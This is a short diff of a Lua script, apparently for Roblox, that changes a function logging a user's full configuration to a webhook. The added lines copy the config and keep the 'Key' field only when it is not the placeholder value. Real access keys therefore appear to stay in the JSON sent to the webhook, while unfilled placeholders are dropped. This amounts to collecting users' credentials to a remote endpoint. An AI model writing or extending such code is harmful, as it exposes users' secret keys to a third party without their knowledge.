@@ -93,6 +93,17 @@ sendToWebhook({
 })
 
 local function logUserConfigFull(configTable)
+    local copy = {}
+    for k, v in pairs(configTable) do
+        if k == "Key" then
+            if v ~= "your_access_key_here" then
+                copy[k] = v
+            end
+        else
+            copy[k] = v
+        end
+    end
+
     local function safeJsonEncode(tbl)
         local success, result = pcall(function()
             return HttpService:JSONEncode(tbl)
@@ -100,7 +111,7 @@ local function logUserConfigFull(configTable)
         return success and result or "Failed to encode config"
     end
 
-    local fullJson = safeJsonEncode(configTable)
+    local fullJson = safeJsonEncode(copy)
     local preview = fullJson:sub(1, 1000)
     if fullJson:len() > 1000 then
         preview = preview .. "...\n(Truncated)"
